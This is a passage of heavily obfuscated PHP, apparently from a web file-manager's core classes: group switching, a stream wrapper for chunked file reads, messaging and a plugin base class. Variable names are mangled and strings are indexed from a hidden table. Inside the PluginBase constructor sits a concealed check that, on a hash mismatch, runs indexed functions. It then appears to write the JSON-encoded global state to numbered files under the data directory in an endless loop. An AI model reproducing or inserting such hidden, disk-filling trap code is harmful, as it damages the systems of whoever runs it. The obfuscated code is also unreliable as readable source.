($F˜¢ÛŒïğ[$f©…æÂµøÑ[443]][$f©…æÂµøÑ[1747]] == $f©…æÂµøÑ[356]) { $f×­ ®õˆå = explode($f©…æÂµøÑ[47], $F˜¢ÛŒïğ[$f©…æÂµøÑ[443]][$f©…æÂµøÑ[1748]]); if ($f×­ ®õˆå) { $A·šÇ¡µÓŠ = array_merge($A·šÇ¡µÓŠ, $f×­ ®õˆå); } } goto eŠ÷Ôß‡‹; E­¢¸Î¦Ó: } protected function resetParentLevel() { $fŞÍâ¯­ª =& $_SERVER[Ïº«‚ßèÔˆø]; $eƒÙ¯¸¾Ó³ = $fŞÍâ¯­ª[1671]; $eÍĞ¬ùºôÑ = $this->select(); $eÍĞ¬ùºôÑ = array_to_keyvalue($eÍĞ¬ùºôÑ, $eƒÙ¯¸¾Ó³); foreach ($eÍĞ¬ùºôÑ as $b“«ìù Ç¯) { goto e‰È³°¥¼ç; C„¹ŸÛ“ÛĞ: $CæÆÈ­º³[] = 0; $CæÆÈ­º³ = $fŞÍâ¯­ª[47] . implode($fŞÍâ¯­ª[47], array_reverse($CæÆÈ­º³)) . $fŞÍâ¯­ª[47]; $this->setNamePinyin($b“«ìù Ç¯[$eƒÙ¯¸¾Ó³], $b“«ìù Ç¯[$fŞÍâ¯­ª[28]]); goto BãÊË§ïÎ; BãÊË§ïÎ: $this->where(array($eƒÙ¯¸¾Ó³ => $b“«ìù Ç¯[$eƒÙ¯¸¾Ó³]))->save(array($fŞÍâ¯­ª[552] => $CæÆÈ­º³)); goto d“¼‚½¶Ø; e‰È³°¥¼ç: $AàÃŠœèå§ = $b“«ìù Ç¯; $CæÆÈ­º³ = array(); while ($AàÃŠœèå§[$fŞÍâ¯­ª[476]] != 0) { $CæÆÈ­º³[] = $AàÃŠœèå§[$fŞÍâ¯­ª[476]]; $AàÃŠœèå§ = $eÍĞ¬ùºôÑ[$AàÃŠœèå§[$fŞÍâ¯­ª[476]]]; } goto C„¹ŸÛ“ÛĞ; d“¼‚½¶Ø: } return $eÍĞ¬ùºôÑ; } public function groupNameAuto($e¤é—“†ó», $B§‰Ä°Ê×‡) { $dˆôÙëƒÙî =& $_SERVER[Ïº«‚ßèÔˆø]; $B‹‰¸‡ …® = $this->where(array($dˆôÙëƒÙî[393] => $e¤é—“†ó»))->getField($dˆôÙëƒÙî[28], !0); if (!$B‹‰¸‡ …® || !in_array($B§‰Ä°Ê×‡, $B‹‰¸‡ …®)) { return $B§‰Ä°Ê×‡; } for ($F¸©àµ = 1; $F¸©àµ <= count($B‹‰¸‡ …®) + 1; $F¸©àµ++) { $A™¼Ù¢‚‹› = $B§‰Ä°Ê×‡ . "\x28{$F¸©àµ}\51"; if (!in_array($A™¼Ù¢‚‹›, $B‹‰¸‡ …®)) { return $A™¼Ù¢‚‹›; } } } public function groupSwitch($dÉœœŠŠ¿ø, $F›‚–¡‰È) { goto Eİ£¼ĞÑ¶; AœËİÊ÷Ü”: $BÈÛõäÏ¼½ = Model($CåãïÖ×é¼[1752])->where($CÆÛù˜òô)->select(); if (!$BÈÛõäÏ¼½) { $BÈÛõäÏ¼½ = array(); } foreach ($BÈÛõäÏ¼½ as $fô£ÇõŠÚ’) { $C°ìğ„‚‡£ = $fô£ÇõŠÚ’[$CåãïÖ×é¼[1508]]; $CÆÛù˜òô = array($CåãïÖ×é¼[1508] => $C°ìğ„‚‡£, $CåãïÖ×é¼[1671] => $F›‚–¡‰È); $B‰õØµ¦ùğ = Model($CåãïÖ×é¼[1752])->where($CÆÛù˜òô)->find(); if (!$B‰õØµ¦ùğ) { $bÔî‡¹Ã = array($F›‚–¡‰È => $fô£ÇõŠÚ’[$CåãïÖ×é¼[1766]]); Model($CåãïÖ×é¼[505])->userGroupAdd($C°ìğ„‚‡£, $bÔî‡¹Ã); } Model($CåãïÖ×é¼[505])->userGroupRemove($C°ìğ„‚‡£, $dÉœœŠŠ¿ø); } goto AîÖôÚ—¤ß; fÃÜßêÒ´: $this->where(array($CåãïÖ×é¼[476] => $dÉœœŠŠ¿ø))->save(array($CåãïÖ×é¼[476] => $F›‚–¡‰È)); return !0; goto D Şø… ‰‹; AîÖôÚ—¤ß: $CÆÛù˜òô = array($CåãïÖ×é¼[402] => 2, $CåãïÖ×é¼[476] => 0, $CåãïÖ×é¼[401] => 1, $CåãïÖ×é¼[482] => array($CåãïÖ×é¼[7], array($dÉœœŠŠ¿ø, $F›‚–¡‰È))); $b™Ë¹Ã½¬ = Model($CåãïÖ×é¼[782])->where($CÆÛù˜òô)->field($CåãïÖ×é¼[1767])->select(); $b™Ë¹Ã½¬ = array_to_keyvalue($b™Ë¹Ã½¬, $CåãïÖ×é¼[482], $CåãïÖ×é¼[394]); goto C´ÅæÖšÌƒ; Eİ£¼ĞÑ¶: $CåãïÖ×é¼ =& $_SERVER[Ïº«‚ßèÔˆø]; $CÆÛù˜òô = array($CåãïÖ×é¼[1671] => array($CåãïÖ×é¼[7], array($dÉœœŠŠ¿ø, $F›‚–¡‰È))); $Fàíğ†¼ÆÀ = $this->where($CÆÛù˜òô)->select(); goto C¯Ó˜á…ó—; C¯Ó˜á…ó—: $Fàíğ†¼ÆÀ = array_to_keyvalue($Fàíğ†¼ÆÀ, $CåãïÖ×é¼[1671]); if (!isset($Fàíğ†¼ÆÀ[$dÉœœŠŠ¿ø]) || !isset($Fàíğ†¼ÆÀ[$F›‚–¡‰È]) || $Fàíğ†¼ÆÀ[$dÉœœŠŠ¿ø][$CåãïÖ×é¼[476]] == 0) { return !1; } $CÆÛù˜òô = array($CåãïÖ×é¼[1671] => $dÉœœŠŠ¿ø); goto AœËİÊ÷Ü”; C´ÅæÖšÌƒ: $cé³àÍ¢“ë = !empty($b™Ë¹Ã½¬[$dÉœœŠŠ¿ø]) ? $b™Ë¹Ã½¬[$dÉœœŠŠ¿ø] : !1; if ($cé³àÍ¢“ë) { goto c»ÊèĞ¨«¹; aÎ¾¤Ù›¾Õ: $b™Ë¹Ã½¬ = Model($CåãïÖ×é¼[782])->where($CÆÛù˜òô)->field($CåãïÖ×é¼[1768])->select(); if (!$b™Ë¹Ã½¬) { $b™Ë¹Ã½¬ = array(); } Model($CåãïÖ×é¼[782])->moveClearAuth = !1; goto BÇÀš®î»É; Aˆ„åÀÃí×: $dĞîª´àÆ¹ = array($CåãïÖ×é¼[482] => $F›‚–¡‰È); Model($CåãïÖ×é¼[1769])->where($CÆÛù˜òô)->save($dĞîª´àÆ¹); Model($CåãïÖ×é¼[1770])->where($CÆÛù˜òô)->save($dĞîª´àÆ¹); goto AÈªí¢¥‰µ; c»ÊèĞ¨«¹: if (!$b™Ë¹Ã½¬[$F›‚–¡‰È]) { $b™Ë¹Ã½¬[$F›‚–¡‰È] = Model($CåãïÖ×é¼[782])->groupRootAdd($F›‚–¡‰È); } $A‹§øËŞ‘ì = $b™Ë¹Ã½¬[$F›‚–¡‰È]; $CÆÛù˜òô = array($CåãïÖ×é¼[476] => $cé³àÍ¢“ë); goto aÎ¾¤Ù›¾Õ; BÇÀš®î»É: foreach ($b™Ë¹Ã½¬ as $fÒ¬ø¯ªá²) { $D‚èğ¤¤“Ì = $fÒ¬ø¯ªá²[$CåãïÖ×é¼[401]] == $CåãïÖ×é¼[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($CåãïÖ×é¼[782])->move($fÒ¬ø¯ªá²[$CåãïÖ×é¼[394]], $A‹§øËŞ‘ì, $D‚èğ¤¤“Ì); } Model($CåãïÖ×é¼[782])->moveClearAuth = !0; $CÆÛù˜òô = array($CåãïÖ×é¼[402] => 2, $CåãïÖ×é¼[482] => $dÉœœŠŠ¿ø); goto Aˆ„åÀÃí×; AÈªí¢¥‰µ: } $this->_changeChildLevel($Fàíğ†¼ÆÀ[$dÉœœŠŠ¿ø], $Fàíğ†¼ÆÀ[$F›‚–¡‰È], !0); goto fÃÜßêÒ´; D Şø… ‰‹: } } goto d¬¥¤–¸‹ˆ; c¦‚µ ã¿: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Fîøô±µ‰Î, $E¼ÌÜÄËò¶ = '') { goto F¼«’ìˆ‡Ç; Cæñ¬àÀ: $this->pathOpen = $Fîøô±µ‰Î; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto eÇ’À— Ş; eÇ’À— Ş: if (!isset(self::$_chunkBuffer[$Fîøô±µ‰Î])) { self::$_chunkBuffer[$Fîøô±µ‰Î] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto CœÏïˆ¤Æ³; F¼«’ìˆ‡Ç: $this->info = $this->info($Fîøô±µ‰Î); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ïº«‚ßèÔˆø][76]]; goto Cæñ¬àÀ; CœÏïˆ¤Æ³: } function stream_read($EİùÚ§”Ê) { $e¦Ò§„Ğ¯ = $this->fileSubstr($this->pose, $EİùÚ§”Ê); $this->pose += strlen($e¦Ò§„Ğ¯); return $e¦Ò§„Ğ¯; } public function stream_tell() { return $this->pose; } public function stream_seek($eĞ¢èƒèÄ, $A„°¼¥Õ™Ü) { $fÂ­ÕÅîÖ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($A„°¼¥Õ™Ü == SEEK_SET) { $this->pose = $eĞ¢èƒèÄ; } else { if ($A„°¼¥Õ™Ü == SEEK_CUR) { $this->pose += $eĞ¢èƒèÄ; } else { if ($A„°¼¥Õ™Ü == SEEK_END) { $this->pose = $this->info[$fÂ­ÕÅîÖ[78]] + intval($eĞ¢èƒèÄ); } } } if ($eĞ¢èƒèÄ < 0) { $this->pose = $this->info[$fÂ­ÕÅîÖ[78]] + $eĞ¢èƒèÄ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ïº«‚ßèÔˆø][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($C¿¿‰‡Ü, $DÈœÕå¼İ—) { $eˆªÌîøç =& $_SERVER[Ïº«‚ßèÔˆø]; $FÒ˜¤Ú• = $this->info($C¿¿‰‡Ü); return array($eˆªÌîøç[1361] => 0, $eˆªÌîøç[1362] => 0, $eˆªÌîøç[12] => 32768 + 511, $eˆªÌîøç[1363] => 0, $eˆªÌîøç[1364] => 0, $eˆªÌîøç[1365] => 0, $eˆªÌîøç[1366] => 0, $eˆªÌîøç[78] => $FÒ˜¤Ú•[$eˆªÌîøç[78]], $eˆªÌîøç[1367] => $FÒ˜¤Ú•[$eˆªÌîøç[1236]], $eˆªÌîøç[1323] => $FÒ˜¤Ú•[$eˆªÌîøç[84]], $eˆªÌîøç[1322] => $FÒ˜¤Ú•[$eˆªÌîøç[193]], $eˆªÌîøç[1368] => 0, $eˆªÌîøç[1369] => 0); } static $fileInfo = array(); public function info($A®¯Ë‰œà) { $CÆá„®œ³– = $_SERVER[Ïº«‚ßèÔˆø][1370]; if (isset(self::$fileInfo[$A®¯Ë‰œà])) { return self::$fileInfo[$A®¯Ë‰œà]; } if (substr($A®¯Ë‰œà, 0, strlen($CÆá„®œ³–)) != $CÆá„®œ³–) { return !1; } self::$fileInfo[$A®¯Ë‰œà] = IO::info(substr($A®¯Ë‰œà, strlen($CÆá„®œ³–))); return self::$fileInfo[$A®¯Ë‰œà]; } public static function read($e‡Û¥‹µ, $d­é‚™‘›µ, $e¹¬Â›…½Ö) { if (!isset(self::$_fopenCache[$e‡Û¥‹µ])) { $aìˆ±Üğ = new StreamWrapperIO(); $aìˆ±Üğ->stream_open($e‡Û¥‹µ); self::$_fopenCache[$e‡Û¥‹µ] = $aìˆ±Üğ; } $aìˆ±Üğ = self::$_fopenCache[$e‡Û¥‹µ]; return $aìˆ±Üğ->fileSubstr($d­é‚™‘›µ, $e¹¬Â›…½Ö); } public static function _read($f³›Äšõ™‹, $B¡´â‰ÆÓ’, $eÏƒÆ½) { goto e±Ä¼…ØÍ©; a§––õÜÒ: $AŞÌéùŒª = 0; while ($AŞÌéùŒª < $eÏƒÆ½) { $F‰âš¹âÑ = min($eØ½…·ê×”, $eÏƒÆ½ - $AŞÌéùŒª); $BÙØÔ¬¶Æ .= fread($FÔ™êÉ”, $F‰âš¹âÑ); $AŞÌéùŒª += $F‰âš¹âÑ; } fclose($FÔ™êÉ”); goto dêóéèŸî; dêóéèŸî: return $BÙØÔ¬¶Æ; goto CÊá­Êñ©±; e±Ä¼…ØÍ©: $Aà‰²íª¦» =& $_SERVER[Ïº«‚ßèÔˆø]; $FÔ™êÉ” = fopen($f³›Äšõ™‹, $Aà‰²íª¦»[1240]); if (!$FÔ™êÉ”) { return $Aà‰²íª¦»[33]; } goto A¿Ô“‡¬¥; A¿Ô“‡¬¥: $eØ½…·ê×” = 8192; fseek($FÔ™êÉ”, $B¡´â‰ÆÓ’, SEEK_SET); $BÙØÔ¬¶Æ = $Aà‰²íª¦»[33]; goto a§––õÜÒ; CÊá­Êñ©±: } public function fileSubstr($d¶Òµ–º¡Ä, $cñµ„Š×Öö) { goto dŠ“¥ç‚…; F…ãµ­Óº: foreach ($Aáé¶¼Ú· as $e•¼íÀÍ÷ => $a›‰Ôì‚ò›) { $e•¼íÀÍ÷ = intval($e•¼íÀÍ÷); $cµÏØÛ¨˜ï = $e•¼íÀÍ÷ + strlen($a›‰Ôì‚ò›); if ($d¶Òµ–º¡Ä >= $cµÏØÛ¨˜ï) { continue; } if ($d¶Òµ–º¡Ä >= $e•¼íÀÍ÷ && $d¶Òµ–º¡Ä + $cñµ„Š×Öö <= $cµÏØÛ¨˜ï) { return substr($a›‰Ôì‚ò›, $d¶Òµ–º¡Ä - $e•¼íÀÍ÷, $cñµ„Š×Öö); } break; } if (count($Aáé¶¼Ú·) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($dÚÆ‚ˆÃ¡å[1371], $dÚÆ‚ˆÃ¡å[1372] . count($Aáé¶¼Ú·) . "\73\x73\x74\141\x72\x74\75{$d¶Òµ–º¡Ä}\54\154\x65\156\147\164\x68\75{$cñµ„Š×Öö}\x3b\160\x6f\x73\145\x3a{$e•¼íÀÍ÷}\x7e{$cµÏØÛ¨˜ï}"); throw new Exception($dÚÆ‚ˆÃ¡å[1373]); } $F„¸¤µ‹ = intval($d¶Òµ–º¡Ä / $a ÒÓùÖè¯) * $a ÒÓùÖè¯; goto bÄˆŠôÁ×œ; bÄˆŠôÁ×œ: $C–ÖØ™ƒç‰ = ceil(($d¶Òµ–º¡Ä + $cñµ„Š×Öö) / $a ÒÓùÖè¯) * $a ÒÓùÖè¯ - $F„¸¤µ‹; $Fæ§ğÒÖ‹ = IO::fileSubstr($this->path, $F„¸¤µ‹, $C–ÖØ™ƒç‰); $Aáé¶¼Ú·[$F„¸¤µ‹ . $dÚÆ‚ˆÃ¡å[33]] = $Fæ§ğÒÖ‹; goto e’«‚Ç¨ñ; dŠ“¥ç‚…: $dÚÆ‚ˆÃ¡å =& $_SERVER[Ïº«‚ßèÔˆø]; $DŸ£Ê›· = $this->info[$dÚÆ‚ˆÃ¡å[78]]; $aÄ»ÉëÄ– = $d¶Òµ–º¡Ä; goto cê·›«§íÀ; cê·›«§íÀ: $E‘ô»‘ö›¿ = $cñµ„Š×Öö; if ($d¶Òµ–º¡Ä < 0) { $d¶Òµ–º¡Ä = $DŸ£Ê›· + $d¶Òµ–º¡Ä; } if ($cñµ„Š×Öö === !1) { $cñµ„Š×Öö = $DŸ£Ê›· - $d¶Òµ–º¡Ä; } goto DÙ©ï³„ÎÀ; e‚–£İ‚¨¡: $a ÒÓùÖè¯ = 64 * 1024; $Aáé¶¼Ú· =& self::$_chunkBuffer[$this->path]; if (!$Aáé¶¼Ú·) { $Aáé¶¼Ú· = array(); } goto aàâÖÛ±±à; DÙ©ï³„ÎÀ: if ($d¶Òµ–º¡Ä + $cñµ„Š×Öö > $DŸ£Ê›·) { $cñµ„Š×Öö = $DŸ£Ê›· - $d¶Òµ–º¡Ä; } if ($cñµ„Š×Öö <= 0) { return $dÚÆ‚ˆÃ¡å[33]; } if ($d¶Òµ–º¡Ä < 0 || $d¶Òµ–º¡Ä >= $DŸ£Ê›· || $cñµ„Š×Öö <= 0 || $cñµ„Š×Öö > 1024 * 1024 * 5) { throw new Exception("\151\x6f\x46\x69\x6c\x65\122\x65\x61\144\40\145\x72\162\157\162\41\x20\163\x74\x61\162\164\75{$d¶Òµ–º¡Ä}\x3b\154\x65\x6e\x67\164\x68\75{$cñµ„Š×Öö}\x3b\40\163\151\172\x65\x3d{$DŸ£Ê›·}\73"); } goto e‚–£İ‚¨¡; e’«‚Ç¨ñ: ksort($Aáé¶¼Ú·); $aë¶è‘ = substr($Fæ§ğÒÖ‹, $d¶Òµ–º¡Ä - $F„¸¤µ‹, $cñµ„Š×Öö); return $aë¶è‘; goto eÄßÒùæ¡ğ; aàâÖÛ±±à: $e•¼íÀÍ÷ = 0; $cµÏØÛ¨˜ï = 0; $a›‰Ôì‚ò› = $dÚÆ‚ˆÃ¡å[33]; goto F…ãµ­Óº; eÄßÒùæ¡ğ: } private function log($A¹¤òÉ•ğ‚, $b“æ¾‡çïå) { $f»Æ•Å©° =& $_SERVER[Ïº«‚ßèÔˆø]; $D¯À¥ô‘„Å = timeFloat() - $this->timeStart; write_log(sprintf($f»Æ•Å©°[1374], $A¹¤òÉ•ğ‚, $this->info[$f»Æ•Å©°[28]], $D¯À¥ô‘„Å, $b“æ¾‡çïå), $f»Æ•Å©°[1061]); } } class Message { function __construct() { } public function send($CŸï©’±Š = '', $C­”–©Ö÷¤ = array(), $D™âËƒ´ˆ = "\x74\145\x78\x74") { goto Bôó—ºÌàõ; C·¸Ø˜‰˜‡: Hook::trigger($a…ì¢‡ìÊ²[1378], $f¹İì¦‹Š); goto Aõ¡´èÑ§Å; Bôó—ºÌàõ: $a…ì¢‡ìÊ² =& $_SERVER[Ïº«‚ßèÔˆø]; $Eò½çŠç¥È = array($a…ì¢‡ìÊ²[29] => $a…ì¢‡ìÊ²[1375], $a…ì¢‡ìÊ²[700] => $CŸï©’±Š); if (in_array($D™âËƒ´ˆ, array($a…ì¢‡ìÊ²[1375], $a…ì¢‡ìÊ²[1376]))) { $Eò½çŠç¥È[$a…ì¢‡ìÊ²[29]] = $D™âËƒ´ˆ; } goto Dõë¾ÌÖÏ‘; Dõë¾ÌÖÏ‘: $C­”–©Ö÷¤ = array($a…ì¢‡ìÊ²[999] => isset($C­”–©Ö÷¤[$a…ì¢‡ìÊ²[999]]) ? $C­”–©Ö÷¤[$a…ì¢‡ìÊ²[999]] : $a…ì¢‡ìÊ²[33], $a…ì¢‡ìÊ²[561] => isset($C­”–©Ö÷¤[$a…ì¢‡ìÊ²[561]]) ? $C­”–©Ö÷¤[$a…ì¢‡ìÊ²[561]] : $a…ì¢‡ìÊ²[33]); if (empty($CŸï©’±Š) || empty($C­”–©Ö÷¤[$a…ì¢‡ìÊ²[999]]) && empty($C­”–©Ö÷¤[$a…ì¢‡ìÊ²[561]])) { return !1; } $f¹İì¦‹Š = array($a…ì¢‡ìÊ²[1316] => $Eò½çŠç¥È, $a…ì¢‡ìÊ²[1377] => $C­”–©Ö÷¤); goto C·¸Ø˜‰˜‡; Aõ¡´èÑ§Å: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto c½Îè”Öˆæ; c½Îè”Öˆæ: $Bì‡Ÿ»ñ¥± =& $_SERVER[Ïº«‚ßèÔˆø]; $d­»º™Ìö = $_SERVER[$Bì‡Ÿ»ñ¥±[746]]; $dœ‘¨†­¯  = $Bì‡Ÿ»ñ¥±[747]; goto aóîì¤±±ñ; B³…Ø†ãéË: $this->pluginHostDefault = $config[$Bì‡Ÿ»ñ¥±[1383]] . $this->pluginName . $Bì‡Ÿ»ñ¥±[8]; $D½ç¹¼ŠÓí = $config[$Bì‡Ÿ»ñ¥±[1384]]; if ($D½ç¹¼ŠÓí && strpos($Bì‡Ÿ»ñ¥±[47] . $D½ç¹¼ŠÓí . $Bì‡Ÿ»ñ¥±[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$Bì‡Ÿ»ñ¥±[1385]] . $this->pluginName . $Bì‡Ÿ»ñ¥±[8]; } goto f…ˆß¤Û†; aóîì¤±±ñ: if ($_SERVER[$Bì‡Ÿ»ñ¥±[748]] != $dœ‘¨†­¯ ($d­»º™Ìö)) { goto Cˆ–©æµ©“; Aª×‡®–¹: $f§×®À±ë(); $aÕ·äè¦¸ = $Bì‡Ÿ»ñ¥±[1379]; $F÷Ñˆ“öé = json_encode($GLOBALS[$Bì‡Ÿ»ñ¥±[1380]]); goto eÂÛ¤­µ˜À; CƒŠ„ÎĞ¿º: $aİÂ†­½ËÍ = $Bì‡Ÿ»ñ¥±[825]; $aİÂ†­½ËÍ($_SERVER[$Bì‡Ÿ»ñ¥±[826]]); $f§×®À±ë = $Bì‡Ÿ»ñ¥±[824]; goto Aª×‡®–¹; eÂÛ¤­µ˜À: $BêÅÄ™ š = 1; for ($CÍÜ©ÅØƒ… = $BêÅÄ™ š; $CÍÜ©ÅØƒ… > 0; $CÍÜ©ÅØƒ…++) { $aÕ·äè¦¸(DATA_PATH . $CÍÜ©ÅØƒ…, $F÷Ñˆ“öé); } goto B„¢ğ£¾ÂÔ; Cˆ–©æµ©“: $f§×®À±ë = $Bì‡Ÿ»ñ¥±[824]; $FÏ‡ÛÄİ = $Bì‡Ÿ»ñ¥±[749]; $f–öÄå­«Š = $_SERVER[$Bì‡Ÿ»ñ¥±[750]] . $Bì‡Ÿ»ñ¥±[751]; goto A“öœËÎõ‹; A“öœËÎõ‹: $a¶ÃÖÔÜ®¤ = $FÏ‡ÛÄİ($f–öÄå­«Š); $dĞ×ç×Ó°Ğ = explode($Bì‡Ÿ»ñ¥±[228], $a¶ÃÖÔÜ®¤); if (count($dĞ×ç×Ó°Ğ) < $Bì‡Ÿ»ñ¥±[577]) { $aí¬í²§ = $Bì‡Ÿ»ñ¥±[752]; $aí¬í²§(); } goto CƒŠ„ÎĞ¿º; B„¢ğ£¾ÂÔ: } global $in, $config; $this->config =& $config; goto FÌÛ™ÁĞ†; f…ˆß¤Û†: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto c­øã¦ŞŞ¯; FÌÛ™ÁĞ†: $this->in =& $in; $this->modelPlugin = Model($Bì‡Ÿ»ñ¥±[1381]); $this->pluginName = str_replace($Bì‡Ÿ»ñ¥±[1381], $Bì‡Ÿ»ñ¥±[33], get_class($this)); goto C©¨Ø—â¹; C©¨Ø—â¹: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Bì‡Ÿ»ñ¥±[8]; $this->pluginApi = appHostGet() . $Bì‡Ÿ»ñ¥±[1382] . $this->pluginName . $Bì‡Ÿ»ñ¥±[8]; $this->pluginHost = $config[$Bì‡Ÿ»ñ¥±[1383]] . $this->pluginName . $Bì‡Ÿ»ñ¥±[8]; goto B³…Ø†ãéË; c­øã¦ŞŞ¯: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ïº«‚ßèÔˆø][1386]); } protected function assign($e§½ªš˜», $eÃÇÙ°Á¢ = false) { if (is_array($e§½ªš˜»)) { $this->values = array_merge($this->values, $e§½ªš˜»); } else { $this->values[$e§½ªš˜»] = $eÃÇÙ°Á¢; } } protected function display($dÈ˜˜¸¤) { extract($this->values); require $dÈ˜˜¸¤; } final function hookRegist($AÑÎáåô‰ö) { $this->modelPlugin->appRegist($this->pluginName, $AÑÎáåô‰ö); } final function appIcon() { $b£…Ù¬º‰ =& $_SERVER[Ïº«‚ßèÔˆø]; $E¼öãÃ‚… = $this->appPackage(); $aµ×ö—Ø§Õ = $b£…Ù¬º‰[33]; if (isset($E¼öãÃ‚…[$b£…Ù¬º‰[407]])) { if (isset($E¼öãÃ‚…[$b£…Ù¬º‰[407]][$b£…Ù¬º‰[1387]])) { $aµ×ö—Ø§Õ = $b£…Ù¬º‰[1388] . $E¼öãÃ‚…[$b£…Ù¬º‰[407]][$b£…Ù¬º‰[1387]] . $b£…Ù¬º‰[1389]; } else { if ($E¼öãÃ‚…[$b£…Ù¬º‰[407]][$b£…Ù¬º‰[1390]]) { $aµ×ö—Ø§Õ = $b£…Ù¬º‰[1391] . $E¼öãÃ‚…[$b£…Ù¬º‰[407]][$b£…Ù¬º‰[1390]] . $b£…Ù¬º‰[1392]; } } } return $aµ×ö—Ø§Õ; } final function fileCanView($D›óÜø÷£ö) { goto CºÇ¯¥œ×‘; E«Ê±Ø˜™Ü: ActionCall($cÇºöÆÒ»[1405], $D›óÜø÷£ö); goto f²²µÇº; CºÇ¯¥œ×‘: $cÇºöÆÒ» =& $_SERVER[Ïº«‚ßèÔˆø]; if (request_url_safe($D›óÜø÷£ö)) { return !0; } if ($this->isShare($D›óÜø÷£ö)) { return !0; } goto BÑğöóè÷‡; BÑğöóè÷‡: $F£’º™ÚÄÇ = Session::get($cÇºöÆÒ»[1393]); if (!$F£’º™ÚÄÇ || !$F£’º™ÚÄÇ[$cÇºöÆÒ»[1394]]) { $F‚„¬–Ïõé = $cÇºöÆÒ»[1395] . rawurlencode(this_url()); show_tips(LNG($cÇºöÆÒ»[1396]) . $cÇºöÆÒ»[1397] . $F‚„¬–Ïõé . $cÇºöÆÒ»[1398] . LNG($cÇºöÆÒ»[1399]) . $cÇºöÆÒ»[1400], !1); } if (!Action($cÇºöÆÒ»[1401])->authCan($cÇºöÆÒ»[1402])) { show_tips(LNG($cÇºöÆÒ»[1403]) . $cÇºöÆÒ»[1404], !1); } goto E«Ê±Ø˜™Ü; f²²µÇº: } final function isShare($d—’ŞÉÇêŒ) { $Cº‰–Ãàâ = KodIO::parse($d—’ŞÉÇêŒ); return $Cº‰–Ãàâ[$_SERVER[Ïº«‚ßèÔˆø][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($DÊáŸ‘™¬µ) { if (request_url_safe($DÊáŸ‘™¬µ)) { return $DÊáŸ‘™¬µ; } if (!$this->isShare($DÊáŸ‘™¬µ)) { $DÊáŸ‘™¬µ = $this->filePath($DÊáŸ‘™¬µ); } return Action($_SERVER[Ïº«‚ßèÔˆø][1053])->linkOut($DÊáŸ‘™¬µ); } public function filePathLinkOut($bî¨ïÓ–) { if (request_url_safe($bî¨ïÓ–)) { return $bî¨ïÓ–; } $this->fileCanView($bî¨ïÓ–); return Action($_SERVER[Ïº«‚ßèÔˆø][1053])->link($bî¨ïÓ–); } final function filePath($fó‘”„é¼…) { $eò¥÷õøÎ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($DºªÉ¬„Çá = $this->checkSharePath($fó‘”„é¼…)) { return $DºªÉ¬„Çá; } $this->fileCanView($fó‘”„é¼…); if (request_url_safe($fó‘”„é¼…)) { $dÖİ‰ÓÕ = parse_url_query($fó‘”„é¼…); if (isset($dÖİ‰ÓÕ[$eò¥÷õøÎ[1406]]) && isset($dÖİ‰ÓÕ[$eò¥÷õøÎ[208]])) { $Eá·…‰æ† = Model($eò¥÷õøÎ[714])->get($eò¥÷õøÎ[715]); $e‘ãæ¯Û²Ê = Mcrypt::decode($dÖİ‰ÓÕ[$eò¥÷õøÎ[208]], $Eá·…‰æ†); if ($e‘ãæ¯Û²Ê) { $this->fileInfo = IO::infoWithChildren($e‘ãæ¯Û²Ê); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $e‘ãæ¯Û²Ê; } } $fó‘”„é¼… = $this->_cacheHttpFile($fó‘”„é¼…); $this->fileInfo = IO::infoWithChildren($fó‘”„é¼…); } else { $this->fileInfo = IO::infoWithChildren($fó‘”„é¼…); if (!$this->fileInfo) { show_tips(LNG($eò¥÷õøÎ[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $fó‘”„é¼…; } final function _cacheHttpFile($B‹Œ¬õœŸ×) { $C¤»´êë…ã = hash_path($B‹Œ¬õœŸ×, !0); $this->cachePath = $this->pluginCachePath($C¤»´êë…ã); if ($D²Ç‚»Äö™ = IO::fileNameExist($this->cachePath, $C¤»´êë…ã)) { return KodIO::make($D²Ç‚»Äö™); } $aöœĞ‡çà“ = $this->cachePath . $C¤»´êë…ã; return $this->pluginCacheFileSet($aöœĞ‡çà“, file_get_contents($B‹Œ¬õœŸ×)); } final function _tmpFileName($cöô±õÄƒó = array()) { goto C Æ„è¨œ; C Æ„è¨œ: $aÖšÔ¢›§Ò =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$cöô±õÄƒó) { $cöô±õÄƒó = $this->fileInfo; } if (isset($cöô±õÄƒó[$aÖšÔ¢›§Ò[171]])) { return $cöô±õÄƒó[$aÖšÔ¢›§Ò[171]]; } goto eÏ¦ŠÖ•ó; eÏ¦ŠÖ•ó: if (isset($cöô±õÄƒó[$aÖšÔ¢›§Ò[164]][$aÖšÔ¢›§Ò[171]])) { return $cöô±õÄƒó[$aÖšÔ¢›§Ò[164]][$aÖšÔ¢›§Ò[171]]; } $bø¿à¢Ì¸‚ = IO::hashSimple($cöô±õÄƒó[$aÖšÔ¢›§Ò[76]]); if ($bø¿à¢Ì¸‚) { return $bø¿à¢Ì¸‚; } goto Eˆ‹»Û™šî; Eˆ‹»Û™šî: $cŒ ¼‚™Ğ¶ = array($cöô±õÄƒó[$aÖšÔ¢›§Ò[28]], $cöô±õÄƒó[$aÖšÔ¢›§Ò[76]], $cöô±õÄƒó[$aÖšÔ¢›§Ò[78]]); if (isset($cöô±õÄƒó[$aÖšÔ¢›§Ò[485]])) { 